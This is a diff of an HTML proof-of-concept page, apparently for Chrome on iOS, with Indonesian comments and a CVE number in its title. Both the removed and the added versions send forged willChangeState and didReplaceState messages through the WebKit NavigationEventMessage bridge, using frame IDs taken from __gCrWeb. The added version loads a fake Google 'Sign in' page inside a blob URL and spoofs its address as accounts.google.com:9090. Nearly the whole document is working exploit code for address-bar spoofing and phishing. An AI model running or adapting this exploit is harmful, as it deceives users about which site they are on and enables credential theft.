@@ -1,166 +1,188 @@
 <!doctype html>
-<meta charset="utf-8">
-<title>Ultimate Production-Grade Security Test Harness: History State Origin Fuzzings</title>
-<style>
-  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #020617; color: #f8fafc; }
-  .wrapper { max-width: 950px; margin: auto; background: #0f172a; padding: 2.5em; border-radius: 14px; border: 1px solid #1e293b; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
-  h2 { color: #38bdf8; margin-top: 0; font-size: 24px; }
-  p { line-height: 1.6; color: #94a3b8; font-size: 14px; }
-  .code-box { background: #020617; padding: 1.2em; border-radius: 8px; border: 1px solid #334155; font-family: monospace; font-size: 12px; color: #38bdf8; margin: 1.2em 0; }
-  button { font-size: 16px; padding: 0.8em 1.8em; background: #6366f1; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; transition: background 0.2s, transform 0.1s; }
-  button:hover { background: #4f46e5; transform: translateY(-1px); }
-  button:active { transform: translateY(0); }
-  #log { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 12px; margin-top: 1.8em; white-space: pre-wrap; background: #020617; padding: 1.4em; border-radius: 8px; border: 1px solid #1e293b; color: #38bdf8; max-height: 480px; overflow-y: auto; }
-  .highlight { color: #facc15; font-weight: bold; }
-  .chain-badge { color: #ec4899; font-weight: bold; }
-  .success-badge { color: #22c55e; font-weight: bold; }
-</style>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>CVE-2026-95291 All-in-One Consolidated Harness (Custom Port)</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 2em; background: #020617; color: #f8fafc; }
+        .container { max-width: 750px; margin: 40px auto; background: #0f172a; padding: 2.5em; border-radius: 12px; border: 1px solid #1e293b; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.9); }
+        h2 { color: #38bdf8; margin-top: 0; font-size: 24px; border-bottom: 2px solid #1e293b; padding-bottom: 12px; }
+        p { color: #94a3b8; font-size: 14px; line-height: 1.6; }
+        .btn { display: block; width: 100%; margin-top: 1.5em; padding: 0.9em 1.6em; background: #6366f1; color: white; border: none; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: background 0.2s, transform 0.1s; text-align: center; }
+        .btn:hover { background: #4f46e5; }
+        .btn:active { transform: scale(0.99); }
+        #panel { display: none; background: #1e293b; padding: 15px; border-radius: 6px; margin-top: 15px; border: 1px solid #334155; font-size: 13px; color: #38bdf8; }
+        #terminal { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 12px; margin-top: 1.5em; background: #000000; padding: 1.2em; border: 1px solid #1e293b; border-radius: 6px; color: #4ade80; white-space: pre-wrap; max-height: 300px; overflow-y: auto; }
+        .badge { display: inline-block; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 600; background: #0284c7; color: #fff; margin-bottom: 1em; }
+    </style>
+</head>
+<body>
 
-<div class="wrapper">
-  <h2>Ultimate Production-Grade Security Test Harness</h2>
-  <p>Pengujian ini mengevaluasi matriks mutasi skema non-standard secara otomatis dengan penanganan <span class="highlight">Asynchronous Synchronization & Timeout Fallback</span> terpadu.</p>
-  
-  <div class="code-box">
-    Arsitektur Pengujian:<br>
-    - Robust Event Listener Isolation → Dynamic Iframe Lifecycle Management → Strict Origin Policy Verification
-  </div>
+<div class="container">
+    <h2>All-in-One Security Research Harness</h2>
+    <span class="badge">Target: PushState + Lifecycle + Native Bridge Fuzzer (:9090)</span>
+    
+    <div id="panel">
+        <strong>[Trusted State Panel Active]</strong><br>
+        State history berhasil dimodifikasi secara lokal ke jalur /trusted.
+    </div>
 
-  <button id="startFullChainBtn">Jalankan Pengujian Tertinggi</button>
-  
-  <div id="log">Status: Menunggu eksekusi rangkaian dimulai...</div>
+    <p>Modul riset ini menguji manipulasi state lokal, siklus <code>pageshow</code>, kontainer <code>blob:</code>, serta pengiriman sinyal <code>NavigationEventMessage</code> dengan variasi port non-standar/kustom (<code>:9090</code>).</p>
+    
+    <button class="btn" id="executeAllBtn">Jalankan Eksekusi All-in-One (:9090)</button>
+    
+    <div id="terminal">Status: Menunggu eksekusi rangkaian...</div>
 </div>
 
 <script>
-function appendLog(message) {
-    var logEl = document.getElementById('log');
-    logEl.textContent += '\n[' + new Date().toLocaleTimeString() + '] ' + message;
-    logEl.scrollTop = logEl.scrollHeight;
+function logTerm(msg) {
+    var t = document.getElementById('terminal');
+    if (t) {
+        t.textContent += '\n[' + new Date().toLocaleTimeString() + '] ' + msg;
+        t.scrollTop = t.scrollHeight;
+    }
+    console.log('[AllInOnePort] ' + msg);
 }
 
-document.getElementById('startFullChainBtn').onclick = function() {
-    // Perbaikan typo penulisan elemen log pada versi sebelumnya
-    document.getElementById('log').textContent = 'Inisialisasi rangkaian pengujian tingkat lanjut...';
-    
-    var mutationVectors = [
-        { name: "Blob Standard Cross-Origin", url: "blob:https://victim-alpha.com/uuid-chain-1" },
-        { name: "Blob Nested / Subdomain", url: "blob:https://sub.victim-beta.com/uuid-chain-2" },
-        { name: "Opaque Scheme Variant", url: "blob:null/uuid-chain-3" },
-        { name: "Data URI Variant", url: "data:text/html,<html></html>" },
-        { name: "Malformed Protocol Prefix", url: "blobblob:https://victim-alpha.com/" }
-    ];
+// Pemantauan Lifecycle Pageshow
+window.addEventListener('pageshow', (event) => {
+    logTerm('Event "pageshow" tertangkap. (persisted: ' + event.persisted + ')');
+    requestAnimationFrame(() => {
+        requestAnimationFrame(() => {
+            setTimeout(() => {
+                logTerm('Siklus double rAF + delay 80ms selesai.');
+            }, 80);
+        });
+    });
+});
 
-    var vectorIndex = 0;
-    var activeIframe = null;
+// Eksekusi Tunggal (All-in-One Trigger dengan Port Kustom)
+document.getElementById('executeAllBtn').onclick = function() {
+    logTerm('=== MEMULAI RANGKAIAN EKSEKUSI (PORT 9090) ===');
 
-    function cleanupCurrentFrame() {
-        if (activeIframe && activeIframe.parentNode) {
-            activeIframe.parentNode.removeChild(activeIframe);
-            activeIframe = null;
-        }
+    // 1. Manipulasi State Lokal & Tampilan Panel
+    try {
+        history.pushState({ trustedState: true }, '', '/trusted');
+        document.getElementById('panel').style.display = 'block';
+        logTerm('[1/3] history.pushState sukses. URL lokal diperbarui ke /trusted.');
+    } catch (err) {
+        logTerm('[1/3] Error pushState: ' + err.message);
     }
 
-    function runNextChainStep() {
-        if (vectorIndex >= mutationVectors.length) {
-            appendLog('\n<span class="success-badge">[SELESAI TOTAL]</span> Seluruh rangkaian pengujian berhasil dieksekusi secara end-to-end.');
-            return;
-        }
+    // 2. Persiapan Payload Native Bridge Fuzzer dengan Port 9090
+    logTerm('[2/3] Mengonfigurasi parameter fuzzer dengan port kustom :9090...');
+    var targetVictim = 'accounts.google.com:9090';
+    var spoofUrl = 'blob:https://' + targetVictim + '/signin';
+    var bypassBaseUrl = 'https://' + targetVictim + '/';
 
-        cleanupCurrentFrame();
+    var fuzzerPayload = '<!doctype html>\n' +
+    '<meta charset=utf-8>\n' +
+    '<title>Sign in - Research Payload (:9090)</title>\n' +
+    '<style>\n' +
+    '  body { background: #fff; font-family: -apple-system, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }\n' +
+    '  .card { border: 1px solid #dadce0; padding: 40px; border-radius: 8px; width: 360px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }\n' +
+    '  h2 { color: #202124; font-weight: 400; margin-bottom: 8px; }\n' +
+    '  p { color: #5f6368; font-size: 14px; }\n' +
+    '  #log { font-family: monospace; font-size: 11px; color: #2563eb; margin-top: 15px; white-space: pre-wrap; }\n' +
+    '</style>\n' +
+    '<div class="card">\n' +
+    '  <h2>Sign in</h2>\n' +
+    '  <p>to continue to Google (:9090)</p>\n' +
+    '  <div id="log">Inisialisasi kontainer blob aktif (:9090)...</div>\n' +
+    '</div>\n' +
+    '<script>\n' +
+    '(function() {\n' +
+    '    function innerLog(msg) {\n' +
+    '        var el = document.getElementById("log");\n' +
+    '        if (el) el.textContent += "\\n" + msg;\n' +
+    '        try { console.log("[fuzzer-inner-9090] " + msg); } catch(e){}\n' +
+    '    }\n' +
+    '\n' +
+    '    var mh = window.webkit && window.webkit.messageHandlers;\n' +
+    '    if (!mh || !mh.NavigationEventMessage) {\n' +
+    '        innerLog("[-] Handler NavigationEventMessage tidak aktif (Patch C++ aktif).");\n' +
+    '        return;\n' +
+    '    }\n' +
+    '    innerLog("[+] Handler NavigationEventMessage terdeteksi.");\n' +
+    '\n' +
+    '    function forceRegisterFrame() {\n' +
+    '        try {\n' +
+    '            if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === "function") {\n' +
+    '                window.__gCrWeb.registerFrame();\n' +
+    '            } else if (window.__gCrWeb && window.__gCrWeb.crweb) {\n' +
+    '                window.__gCrWeb.crweb.registerFrame();\n' +
+    '            }\n' +
+    '        } catch(e) {}\n' +
+    '    }\n' +
+    '\n' +
+    '    forceRegisterFrame();\n' +
+    '\n' +
+    '    setTimeout(function() {\n' +
+    '        var fid = null;\n' +
+    '        try {\n' +
+    '            fid = window.__gCrWeb && window.__gCrWeb.getFrameId();\n' +
+    '        } catch(e) {}\n' +
+    '        if (!fid) {\n' +
+    '            try { fid = window.__gCrWeb.common.getFrameId(); } catch(e){}\n' +
+    '        }\n' +
+    '        if (!fid) {\n' +
+    '            try { fid = window.__gCrWeb.frameId; } catch(e){}\n' +
+    '        }\n' +
+    '\n' +
+    '        if (!fid) {\n' +
+    '            innerLog("[-] Gagal mengekstrak frame_id.");\n' +
+    '            return;\n' +
+    '        }\n' +
+    '        innerLog("[+] Frame ID aktif: " + fid.substring(0, 8) + "...");\n' +
+    '\n' +
+    '        var fuzzStep = function(attempt) {\n' +
+    '            forceRegisterFrame();\n' +
+    '            try {\n' +
+    '                innerLog("[*] [Fuzz " + attempt + "] Mengirim willChangeState & didReplaceState (:9090)...");\n' +
+    '                mh.NavigationEventMessage.postMessage({\n' +
+    '                    command: "willChangeState",\n' +
+    '                    frame_id: fid\n' +
+    '                });\n' +
+    '\n' +
+    '                mh.NavigationEventMessage.postMessage({\n' +
+    '                    command: "didReplaceState",\n' +
+    '                    frame_id: fid,\n' +
+    '                    stateObject: "",\n' +
+    '                    baseUrl: "' + bypassBaseUrl + '",\n' +
+    '                    pageUrl: "' + spoofUrl + '"\n' +
+    '                });\n' +
+    '                innerLog("[+] [Fuzz " + attempt + "] Payload kustom port terkirim ke antrean native.");\n' +
+    '            } catch(err) {\n' +
+    '                innerLog("[-] [Fuzz " + attempt + "] Exception: " + err.message);\n' +
+    '            }\n' +
+    '        };\n' +
+    '\n' +
+    '        fuzzStep(1);\n' +
+    '        setTimeout(function() { fuzzStep(2); }, 200);\n' +
+    '        setTimeout(function() { fuzzStep(3); }, 600);\n' +
+    '\n' +
+    '    }, 250);\n' +
+    '})();\n' +
+    '<\/script>';
 
-        var currentVector = mutationVectors[vectorIndex];
-        appendLog('\n<span class="chain-badge">[Langkah ' + (vectorIndex + 1) + '/' + mutationVectors.length + ']</span> Memproses: ' + currentVector.name);
+    // 3. Peluncuran Otomatis ke Blob Container
+    try {
+        logTerm('[3/3] Membungkus payload dengan port kustom ke dalam kontainer Blob URL...');
+        var blobObj = new Blob([fuzzerPayload], { type: 'text/html' });
+        var blobUrl = URL.createObjectURL(blobObj);
 
-        var payloadSource = `<!doctype html>
-        <meta charset=utf-8>
-        <script>
-        (function() {
-            setTimeout(function() {
-                var bridge = window.webkit && window.webkit.messageHandlers;
-                if (!bridge || !bridge.NavigationEventMessage) {
-                    parent.postMessage({
-                        step: ${vectorIndex},
-                        status: 'SECURE_PROTECTED',
-                        details: 'Proteksi aktif: Jembatan pesan internal aman / tidak terekspos.'
-                    }, '*');
-                    return;
-                }
+        logTerm('Blob URL siap: ' + blobUrl);
+        logTerm('Memicu navigasi otomatis...');
 
-                var fId = null;
-                try {
-                    fId = window.__gCrWeb && window.__gCrWeb.getFrameId();
-                } catch(e) {}
+        setTimeout(function() {
+            location.href = blobUrl;
+        }, 500);
 
-                if (!fId) {
-                    parent.postMessage({
-                        step: ${vectorIndex},
-                        status: 'SECURE_PROTECTED',
-                        details: 'Isolasi frame berhasil dikonfirmasi.'
-                    }, '*');
-                    return;
-                }
-
-                try {
-                    bridge.NavigationEventMessage.postMessage({ command: 'willChangeState', frame_id: fId });
-                    bridge.NavigationEventMessage.postMessage({ 
-                        command: 'didReplaceState', 
-                        frame_id: fId, 
-                        stateObject: '', 
-                        baseUrl: 'https://attacker-chain.local/', 
-                        pageUrl: '${currentVector.url}' 
-                    });
-
-                    parent.postMessage({
-                        step: ${vectorIndex},
-                        status: 'CHAIN_SIGNAL_PROCESSED',
-                        details: 'Sinyal berhasil dikirim untuk URL: ${currentVector.url}'
-                    }, '*');
-                } catch(err) {
-                    parent.postMessage({
-                        step: ${vectorIndex},
-                        status: 'ERROR',
-                        details: err.message
-                    }, '*');
-                }
-            }, 100);
-        })();
-        <\/script>`;
-
-        try {
-            var blobObj = new Blob([payloadSource], { type: 'text/html' });
-            var blobUrl = URL.createObjectURL(blobObj);
-
-            var stepTimeout = setTimeout(function() {
-                appendLog('Peringatan: Timeout tercapai pada langkah ' + (vectorIndex + 1) + '. Melanjutkan rantai...');
-                window.removeEventListener('message', messageHandler);
-                vectorIndex++;
-                runNextChainStep();
-            }, 2500);
-
-            var messageHandler = function(evt) {
-                if (evt.data && evt.data.step === vectorIndex) {
-                    clearTimeout(stepTimeout);
-                    appendLog('Hasil Langkah #' + (evt.data.step + 1) + ': ' + evt.data.status);
-                    appendLog('Detail: ' + evt.data.details);
-                    window.removeEventListener('message', messageHandler);
-                    
-                    vectorIndex++;
-                    setTimeout(runNextChainStep, 300);
-                }
-            };
-            window.addEventListener('message', messageHandler);
-
-            activeIframe = document.createElement('iframe');
-            activeIframe.style.display = 'none';
-            activeIframe.src = blobUrl;
-            document.body.appendChild(activeIframe);
-
-        } catch (exc) {
-            appendLog('Kesalahan pada langkah ' + (vectorIndex + 1) + ': ' + exc.message);
-            vectorIndex++;
-            setTimeout(runNextChainStep, 300);
-        }
+    } catch (e) {
+        logTerm('[-] Gagal memproses blob navigation: ' + e.message);
     }
-
-    runNextChainStep();
 };
 </script>
+
+</body>
+</html>
